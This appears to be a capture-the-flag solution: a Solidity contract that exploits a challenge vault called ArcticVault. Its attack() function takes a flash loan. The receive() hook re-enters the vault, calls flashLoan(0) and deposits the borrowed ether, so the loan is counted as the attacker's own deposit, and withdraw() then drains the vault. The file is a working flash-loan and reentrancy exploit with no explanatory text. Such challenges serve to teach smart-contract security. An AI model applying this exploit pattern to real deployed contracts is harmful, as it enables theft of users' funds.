import {ArcticVault} from "./Challenge.sol";
import {Setup} from "./Setup.sol";


contract ArcticVaultExploit {
    ArcticVault public av;
    Setup public setup;
    bool loaned;

    constructor(address _addr) 
    {
        setup = Setup(_addr);
        av = setup.TARGET();
        loaned = false;
    }

    function attack() public{
        av.flashLoan(1 ether);
        av.withdraw();
    }

    function isSolved() public returns (bool){
        return setup.isSolved();
    }

    receive() external payable{
        if (!loaned) {
            loaned = true;
            av.flashLoan(0);
            av.deposit{value: 1 ether}();
        }
    }
}